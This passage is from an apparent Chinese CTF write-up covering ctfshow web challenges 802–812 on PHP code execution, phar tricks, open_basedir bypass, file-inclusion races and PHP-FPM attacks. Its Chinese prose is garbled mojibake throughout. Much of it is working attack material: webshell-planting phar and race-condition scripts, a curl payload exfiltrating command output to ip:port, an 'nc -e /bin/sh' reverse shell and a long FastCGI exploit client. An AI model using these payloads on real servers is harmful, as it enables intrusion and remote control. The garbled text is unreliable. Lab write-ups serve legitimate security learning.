ä¸º8fa8946d-c588-40d0-9458-c3e9cf0a8851c292988f5c1a7a742186319fd5bb28c02167bce3e99959638562210c1ecf54ad</p><p>å¸¦è„šæœ¬é‡Œè·‘å‡ºå€¼ç„¶åè®¿é—®console</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155757898.png" alt="image-20220524155757898"></p><p>å¼•å…¥osåº“æ¥å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155954645.png" alt="image-20220524155954645"></p><h2 id="web802"><a href="#web802" class="headerlink" title="web802"></a>web802</h2><p>æ— æ•°å­—å­—æ¯å‘½ä»¤æ‰§è¡Œ</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd &#x3D; $_POST[&#39;cmd&#39;];if(!preg_match(&#39;&#x2F;[a-z]|[0-9]&#x2F;i&#39;,$cmd))&#123;    eval($cmd);&#125;</code></pre><p>è¿™é‡Œæ˜¾ç„¶å°±ç®—åˆ©ç”¨å¼‚æˆ–ï¼Œéï¼Œå–åæ¥æ„é€ å‘½ä»¤è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p>ç›´æ¥ä¸Šç¾½å¸ˆå‚…çš„è„šæœ¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524160514067.png" alt="image-20220524160514067"></p><h2 id="web803"><a href="#web803" class="headerlink" title="web803"></a>web803</h2><p>pharæ–‡ä»¶åŒ…å«</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-03-19 12:10:55# @Last Modified by:   h1xa# @Last Modified time: 2022-03-19 13:27:18# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.comerror_reporting(0);highlight_file(__FILE__);$file &#x3D; $_POST[&#39;file&#39;];$content &#x3D; $_POST[&#39;content&#39;];if(isset($content) &amp;&amp; !preg_match(&#39;&#x2F;php|data|ftp&#x2F;i&#39;,$file))&#123;    if(file_exists($file.&#39;.txt&#39;))&#123;        include $file.&#39;.txt&#39;;    &#125;else&#123;        file_put_contents($file,$content);    &#125;&#125;</code></pre><p>åœ¨æ–‡ä»¶ååŠ ä¸Šäº†.pharåç¼€ï¼Œè¿™é‡Œç›´æ¥æŠŠé©¬å†™åœ¨pharé‡Œå°±è¡Œäº†</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php       $phar &#x3D; new Phar(&quot;includephar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar       $phar-&gt;startBuffering();    $phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;); &#x2F;&#x2F;è®¾ç½®stub             $phar-&gt;addFromString(&#39;test.txt&#39;, &#39;&lt;?php system($_POST[a]);?&gt;&#39;); &#x2F;&#x2F;    $phar-&gt;stopBuffering();    &#x2F;&#x2F; pharç”Ÿæˆ?&gt;</code></pre><p>æ²¡æƒé™å†™çš„æ—¶å€™å°±å¾€tmpç›®å½•åº•ä¸‹å†™</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524162306332.png" alt="image-20220524162306332"></p><p>ç„¶åç”¨pharåè®®æ¥è®¿é—®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524162356068.png" alt="image-20220524162356068"></p><h2 id="web804"><a href="#web804" class="headerlink" title="web804"></a>web804</h2><p>pharååºåˆ—åŒ–ï¼Œè€ƒçƒ‚äº†å¿«</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);class hacker&#123;    public $code;    public function __destruct()&#123;        eval($this-&gt;code);    &#125;&#125;$file &#x3D; $_POST[&#39;file&#39;];$content &#x3D; $_POST[&#39;content&#39;];if(isset($content) &amp;&amp; !preg_match(&#39;&#x2F;php|data|ftp&#x2F;i&#39;,$file))&#123;    if(file_exists($file))&#123;        unlink($file);    &#125;else&#123;        file_put_contents($file,$content);    &#125;&#125;</code></pre><p>æ„é€ é“¾å­</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524164057529.png" alt="image-20220524164057529"></p><p>ä¼ ä¸Šå»ä¹‹åpharè®¿é—®ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524164042957.png" alt="image-20220524164042957"></p><h2 id="web805"><a href="#web805" class="headerlink" title="web805"></a>web805</h2><p><strong>open_basedirç»•è¿‡</strong></p><p>open_basediræ˜¯php.iniä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå¯ç”¨äºå°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸã€‚</p><p>å‡è®¾open_basedir=/var/www/html/web1/:/tmp/ï¼Œé‚£ä¹ˆé€šè¿‡web1è®¿é—®æœåŠ¡å™¨çš„ç”¨æˆ·å°±æ— æ³•è·å–æœåŠ¡å™¨ä¸Šé™¤äº†/var/www/html/web1/å’Œ/tmp/è¿™ä¸¤ä¸ªç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚</p><p>æ³¨æ„ï¼šç”¨open_basediræŒ‡å®šçš„<strong>é™åˆ¶å®é™…ä¸Šæ˜¯å‰ç¼€ï¼Œè€Œä¸æ˜¯ç›®å½•å</strong>ã€‚</p><p>å¯ä»¥åˆ©ç”¨globåè®®å…ˆéå†ç›®å½•</p><pre class="language-php" data-language="php"><code class="language-php">$a &#x3D; &quot;glob:&#x2F;&#x2F;&#x2F;*&quot;;  if ( $b &#x3D; opendir($a) ) &#123;    while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123;      echo $file.&quot;\n&quot;;    &#125;    closedir($b);  &#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524165320388.png" alt="image-20220524165320388"></p><p>ç„¶ååˆ©ç”¨chdirå’Œmkdirè¯»å–</p><pre class="language-sh" data-language="sh"><code class="language-sh">mkdir(&quot;s&quot;);chdir(&#39;s&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo file_get_contents(&quot;&#x2F;ctfshowflag&quot;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524182720886.png" alt="image-20220524182720886"></p><p><strong>å¦å¤–è¿˜æœ‰ä¸€ç§åˆ©ç”¨pç¥è„šæœ¬çš„æ–¹å¼</strong></p><p>è„šæœ¬æ‡’å¾—è´´äº†ï¼Œä¸»è¦å°±æ˜¯ï¼Œåˆ«ç”¨phpå½“åç¼€ï¼Œä¸ç„¶è„šæœ¬ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ¥æ”¶ä¸äº†é¶æœºä¸Šçš„å‚æ•°ï¼Œåªä¼šæ‰§è¡Œä½ è‡ªå·±vpsä¸Šçš„å†…å®¹ï¼Œè¦ä¸ç„¶å°±è¦å†™ä¸ªflaskå½“è·³æ¿ã€‚ï¼ˆèŠ±äº†ä¸€å¤©çš„è¡€çš„æ•™è®­</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525182618874.png" alt="image-20220525182618874"></p><p>flaskçš„å†…å®¹</p><pre class="language-python" data-language="python"><code class="language-python">from flask import Flaskapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;&#39;)def hello_world():    with open(&#39;opendir.php&#39;,&#39;r&#39;) as f:        pay &#x3D; f.read()    return pay    if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(host&#x3D;&quot;0.0.0.0&quot;, port&#x3D;int(&quot;5001&quot;), debug&#x3D;True)</code></pre><p>åœ¨vpsä¸Šå¼€èµ·æ¥ç„¶åæ–‡ä»¶åŒ…å«</p><h2 id="web806"><a href="#web806" class="headerlink" title="web806"></a>web806</h2><p><strong>phpæ— å‚RCE</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125;?&gt;</code></pre><p>ç»å…¸æ— å‚rceï¼Œç™¾åº¦æ‰¾ä¸€å †payload</p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE Â· sky&#39;s blog (skysec.top)</a></p><p><a href="https://blog.csdn.net/qq_45570082/article/details/106602261">æ— å‚æ•°rce_åå­—è¢«æŠ¢çš„Starsçš„åšå®¢-CSDNåšå®¢_æ— å‚æ•°rce</a></p><p><a href="https://hetian.blog.csdn.net/article/details/107171940?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-107171940-blog-105237550.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-107171940-blog-105237550.pc_relevant_default&amp;utm_relevant_index=5">https://hetian.blog.csdn.net/article/details/107171940?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107171940-blog-105237550.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107171940-blog-105237550.pc_relevant_default&amp;utm_relevant_index=5</a></p><p><code>var_dump(scandir(dirname(dirname(dirname(getcwd())))));</code>è¯»ä¸Šçº§ç›®å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524183248018.png" alt="image-20220524183248018"></p><p>ç”¨è¿™ç§å‡½æ•°æ„é€ çš„æ–¹æ³•æ ¹ç›®å½•æ–‡ä»¶ä¸æ˜¯å¾ˆå¥½è¯»ï¼Œä¸»è¦æ˜¯è¿˜è¦æ„é€ ä¸€ä¸ªæ–œæ </p><pre class="language-txt" data-language="txt"><code class="language-txt">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd()))));</code></pre><p>å†™ä¸ªè„šæœ¬çœ‹è¿æ°”è¯»å§</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524190821873.png" alt="image-20220524190821873"></p><h2 id="web807"><a href="#web807" class="headerlink" title="web807"></a>web807</h2><p><strong>åå¼¹shell</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    error_reporting(0);highlight_file(__FILE__);$url &#x3D; $_GET[&#39;url&#39;];$schema &#x3D; substr($url,0,8);if($schema&#x3D;&#x3D;&#x3D;&quot;https:&#x2F;&#x2F;&quot;)&#123;    shell_exec(&quot;curl $url&quot;);&#125;</code></pre><p>æ‹¿ä¸€ä¸‹ç¾¤ä¸»æ­çš„ç½‘ç«™</p><p><a href="https://your-shell.com/">https://your-shell.com/</a></p><p>åè¾¹å¸¦ä¸Šipå’Œç«¯å£å¸¦ä¸ªshå‘½ä»¤å°±èƒ½ç›´æ¥åå¼¹shelläº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524204159380.png" alt="image-20220524204159380"></p><p>æˆ–è€…å¯ä»¥åˆ©ç”¨åƒdnslogå¤–å¸¦é‚£ç§</p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">https:&#x2F;&#x2F;;curl ip:port?a&#x3D;&#96;ls&#96;</code></pre><h2 id="web808"><a href="#web808" class="headerlink" title="web808"></a>web808</h2><p><strong>å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«</strong></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/106498971">PHP LFI åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶ Getshell å§¿åŠ¿_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢_phpinfoæ‹¿shell</a></p><p><code>include &#39;php://filter/string.strip_tags/resource=/etc/passwd&#39;;</code></p><p>è¿™æ®µä»£ç ä¼šå¯¼è‡´phpè¿›ç¨‹çš„å´©æºƒè€Œè®©æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶ç•™åœ¨ä¸´æ—¶æ–‡ä»¶ç›®å½•ä¸‹ä¸ä¼šè¢«åˆ é™¤</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$file &#x3D; $_GET[&#39;file&#39;];if(isset($file) &amp;&amp; !preg_match(&quot;&#x2F;input|data|phar|log&#x2F;i&quot;,$file))&#123;    include $file;&#125;else&#123;    show_source(__FILE__);    print_r(scandir(&quot;&#x2F;tmp&quot;));&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524210412095.png" alt="image-20220524210412095"></p><p>ç”¨è¿™æ®µä»£ç ä¸Šä¼ å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524210438734.png" alt="image-20220524210438734"></p><p>ç„¶ååŒ…å«ä¸€ä¸‹æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶å°±èƒ½getshelläº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524210616382.png" alt="image-20220524210616382"></p><p>è¿˜æœ‰ä¸€ç§åˆ©ç”¨sessionæ¡ä»¶ç«äº‰æ¥å†™é©¬çš„æ–¹æ³•</p><p><a href="https://www.freebuf.com/articles/web/288430.html">ã€æ–‡ä»¶åŒ…å«&amp;æ¡ä»¶ç«äº‰ã€‘è¯¦è§£å¦‚ä½•åˆ©ç”¨session.upload_progressæ–‡ä»¶åŒ…å«è¿›è¡Œ... - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport ioimport threadingurl &#x3D; &quot;http:&#x2F;&#x2F;192.168.2.128&#x2F;test.php&quot;sessid &#x3D; &quot;Lxxx&quot;def write(session):filebytes &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)while True:res &#x3D; session.post(url,data&#x3D;&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &quot;&lt;?php eval($_POST[1]);?&gt;&quot;&#125;,cookies&#x3D;&#123;&#39;PHPSESSID&#39;: sessid&#125;,files&#x3D;&#123;&#39;file&#39;: (&#39;Lxxx.jpg&#39;, filebytes)&#125;)def read(session):while True:res &#x3D; session.post(url+&quot;?a&#x3D;&#x2F;tmp&#x2F;sess_&quot;+sessid,data&#x3D;&#123;&quot;1&quot;:&quot;file_put_contents(&#39;&#x2F;www&#x2F;admin&#x2F;localhost_80&#x2F;wwwroot&#x2F;1.php&#39; , &#39;&lt;?php eval($_POST[2]);?&gt;&#39;);&quot;&#125;,cookies&#x3D;&#123;&quot;PHPSESSID&quot;:sessid&#125;)res2 &#x3D; session.get(&quot;http:&#x2F;&#x2F;192.168.2.128&#x2F;1.php&quot;)if res2.status_code &#x3D;&#x3D; 200:print(&quot;æˆåŠŸå†™å…¥ä¸€å¥è¯ï¼&quot;)else:print(&quot;Retry&quot;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:evnet &#x3D; threading.Event()with requests.session() as session:for i in range(5):threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()for i in range(5):threading.Thread(target&#x3D;read, args&#x3D;(session,)).start()evnet.set()</code></pre><h2 id="web809"><a href="#web809" class="headerlink" title="web809"></a>web809</h2><p><strong>pearæ–‡ä»¶åŒ…å«RCE</strong></p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿° | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><p><a href="https://blog.csdn.net/weixin_45751765/article/details/121628030?ops_request_misc=%7B%22request_id%22:%22164994550016782089359874%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=164994550016782089359874&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2blogfirst_rank_ecpm_v1~rank_v31_ecpm-1-121628030.nonecase&utm_term=pear&spm=1018.2226.3001.4450">HXBCTF 2021]æ¹–æ¹˜æ¯easywill_k_du1tçš„åšå®¢-CSDNåšå®¢</a></p><blockquote><p>peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š<code>--with-pear</code>æ‰ä¼šå®‰è£…ã€‚</p><p>ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code>ã€‚</p></blockquote><p>åˆ©ç”¨æ¡ä»¶ï¼šregister_argc_argvå¼€å¯</p><p>å½“å¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œç”¨æˆ·çš„è¾“å…¥å°†ä¼šè¢«èµ‹äºˆç»™<code>$argc</code>ã€<code>$argv</code>ã€<code>$_SERVER[&#39;argv&#39;]</code>å‡ ä¸ªå˜é‡ã€‚</p><blockquote><p>â€˜argvâ€™<br>ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°çš„æ•°ç»„ã€‚å½“è„šæœ¬ä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œæ—¶ï¼Œargv å˜é‡ä¼ é€’ç»™ç¨‹åº C è¯­è¨€æ ·å¼çš„å‘½ä»¤è¡Œå‚æ•°ã€‚å½“é€šè¿‡ GET æ–¹å¼è°ƒç”¨æ—¶ï¼Œè¯¥å˜é‡åŒ…å«query stringã€‚</p></blockquote><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524211826336.png" alt="image-20220524211826336"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524212116036.png" alt="image-20220524212116036"></p><p>æˆ‘ä»¬çš„å¯ä»¥åˆ©ç”¨pearä¸­çš„config-createå‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</p><blockquote><p>index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<?=phpinfo()?>+/tmp/hello.php</p><p>ç›®æ ‡å°†ä¼šå†™å…¥ä¸€ä¸ªæ–‡ä»¶<code>/tmp/hello.php</code>ï¼Œå…¶å†…å®¹åŒ…å«<code>&lt;?=phpinfo()?&gt;</code>ï¼š</p></blockquote><p>ç”¨bpå‘åŒ…æŠŠæˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬å†™è¿›å»ï¼Œç„¶åè®¿é—®å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524213125023.png" alt="image-20220524213125023"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524213116263.png" alt="image-20220524213116263"></p><h2 id="web810"><a href="#web810" class="headerlink" title="web810"></a>web810</h2><p><strong>SSRFæ‰“PHP-FPM</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524233127483.png" alt="image-20220524233127483"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524233113854.png" alt="image-20220524233113854"></p><h2 id="web811"><a href="#web811" class="headerlink" title="web811"></a>web811</h2><p><strong>file_put_contentsæ‰“PHP-FPM</strong></p><p>å‚è€ƒé™‡åŸæˆ˜å½¹çš„å¤ç°</p><p>æœ‰ç‚¹è¦æ³¨æ„çš„æ˜¯è¿™é‡Œç”¨bashå¼¹ä¸å‡ºæ¥ï¼Œè¦ç”¨nc ip port -e /bin/sh</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524225414567.png" alt="image-20220524225414567"></p><h2 id="web812"><a href="#web812" class="headerlink" title="web812"></a>web812</h2><p><strong>PHP-FPMæœªæˆæƒ</strong></p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p></blockquote><p>PHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525193643081.png" alt="image-20220525193643081"></p><p>å¯ä»¥ç»“åˆphpå®‰è£…æ—¶å¸¦çš„phpæ–‡ä»¶æ¥æ‰§è¡Œ</p><p>ä¾‹å¦‚/usr/local/lib/php/OS/Guess.php</p><p>è„šæœ¬</p><pre class="language-php" data-language="php"><code class="language-php">import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https:&#x2F;&#x2F;github.com&#x2F;wuyunfeng&#x2F;Python-FastCGI-ClientPY2 &#x3D; True if sys.version_info.major &#x3D;&#x3D; 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i])def bord(c):    if isinstance(c, int):        return c    else:        return ord(c)def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode(&#39;utf-8&#39;, &#39;strict&#39;)def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s &#x3D; str(s, &#39;utf-8&#39;, &#39;strict&#39;)    else:        s &#x3D; str(s)    return sclass FastCGIClient:    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;    # private    __FCGI_VERSION &#x3D; 1    __FCGI_ROLE_RESPONDER &#x3D; 1    __FCGI_ROLE_AUTHORIZER &#x3D; 2    __FCGI_ROLE_FILTER &#x3D; 3    __FCGI_TYPE_BEGIN &#x3D; 1    __FCGI_TYPE_ABORT &#x3D; 2    __FCGI_TYPE_END &#x3D; 3    __FCGI_TYPE_PARAMS &#x3D; 4    __FCGI_TYPE_STDIN &#x3D; 5    __FCGI_TYPE_STDOUT &#x3D; 6    __FCGI_TYPE_STDERR &#x3D; 7    __FCGI_TYPE_DATA &#x3D; 8    __FCGI_TYPE_GETVALUES &#x3D; 9    __FCGI_TYPE_GETVALUES_RESULT &#x3D; 10    __FCGI_TYPE_UNKOWNTYPE &#x3D; 11    __FCGI_HEADER_SIZE &#x3D; 8    # request state    FCGI_STATE_SEND &#x3D; 1    FCGI_STATE_ERROR &#x3D; 2    FCGI_STATE_SUCCESS &#x3D; 3    def __init__(self, host, port, timeout, keepalive):        self.host &#x3D; host        self.port &#x3D; port        self.timeout &#x3D; timeout        if keepalive:            self.keepalive &#x3D; 1        else:            self.keepalive &#x3D; 0        self.sock &#x3D; None        self.requests &#x3D; dict()    def __connect(self):        self.sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        try:            self.sock.connect((self.host, int(self.port)))        except socket.error as msg:            self.sock.close()            self.sock &#x3D; None            print(repr(msg))            return False        return True    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length &#x3D; len(content)        buf &#x3D; bchr(FastCGIClient.__FCGI_VERSION) \               + bchr(fcgi_type) \               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \               + bchr(requestid &amp; 0xFF) \               + bchr((length &gt;&gt; 8) &amp; 0xFF) \               + bchr(length &amp; 0xFF) \               + bchr(0) \               + bchr(0) \               + content        return buf    def __encodeNameValueParams(self, name, value):        nLen &#x3D; len(name)        vLen &#x3D; len(value)        record &#x3D; b&#39;&#39;        if nLen &lt; 128:            record +&#x3D; bchr(nLen)        else:            record +&#x3D; bchr((nLen &gt;&gt; 24) | 0x80) \                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(nLen &amp; 0xFF)        if vLen &lt; 128:            record +&#x3D; bchr(vLen)        else:            record +&#x3D; bchr((vLen &gt;&gt; 24) | 0x80) \                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(vLen &amp; 0xFF)        return record + name + value    def __decodeFastCGIHeader(self, stream):        header &#x3D; dict()        header[&#39;version&#39;] &#x3D; bord(stream[0])        header[&#39;type&#39;] &#x3D; bord(stream[1])        header[&#39;requestId&#39;] &#x3D; (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])        header[&#39;contentLength&#39;] &#x3D; (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])        header[&#39;paddingLength&#39;] &#x3D; bord(stream[6])        header[&#39;reserved&#39;] &#x3D; bord(stream[7])        return header    def __decodeFastCGIRecord(self, buffer):        header &#x3D; buffer.read(int(self.__FCGI_HEADER_SIZE))        if not header:            return False        else:            record &#x3D; self.__decodeFastCGIHeader(header)            record[&#39;content&#39;] &#x3D; b&#39;&#39;                        if &#39;contentLength&#39; in record.keys():                contentLength &#x3D; int(record[&#39;contentLength&#39;])                record[&#39;content&#39;] +&#x3D; buffer.read(contentLength)            if &#39;paddingLength&#39; in record.keys():                skiped &#x3D; buffer.read(int(record[&#39;paddingLength&#39;]))            return record    def request(self, nameValuePairs&#x3D;&#123;&#125;, post&#x3D;&#39;&#39;):        if not self.__connect():            print(&#39;connect failure! please check your fasctcgi-server !!&#39;)            return        requestId &#x3D; random.randint(1, (1 &lt;&lt; 16) - 1)        self.requests[requestId] &#x3D; dict()        request &#x3D; b&quot;&quot;        beginFCGIRecordContent &#x3D; bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord &#x3D; b&#39;&#39;        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name &#x3D; force_bytes(name)                value &#x3D; force_bytes(value)                paramsRecord +&#x3D; self.__encodeNameValueParams(name, value)        if paramsRecord:            request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#39;&#39;, requestId)        if post:            request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#39;&#39;, requestId)        self.sock.send(request)        self.requests[requestId][&#39;state&#39;] &#x3D; FastCGIClient.FCGI_STATE_SEND        self.requests[requestId][&#39;response&#39;] &#x3D; b&#39;&#39;        return self.__waitForResponse(requestId)    def __waitForResponse(self, requestId):        data &#x3D; b&#39;&#39;        while True:            buf &#x3D; self.sock.recv(512)            if not len(buf):                break            data +&#x3D; buf        data &#x3D; BytesIO(data)        while True:            response &#x3D; self.__decodeFastCGIRecord(data)            if not response:                break            if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDOUT \                    or response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR:                if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests[&#39;state&#39;] &#x3D; FastCGIClient.FCGI_STATE_ERROR                if requestId &#x3D;&#x3D; int(response[&#39;requestId&#39;]):                    self.requests[requestId][&#39;response&#39;] +&#x3D; response[&#39;content&#39;]            if response[&#39;type&#39;] &#x3D;&#x3D; FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId][&#39;response&#39;]    def __repr__(self):        return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Php-fpm code execution vulnerability client.&#39;)    parser.add_argument(&#39;host&#39;, help&#x3D;&#39;Target host, such as 127.0.0.1&#39;)    parser.add_argument(&#39;file&#39;, help&#x3D;&#39;A php file absolute path, such as 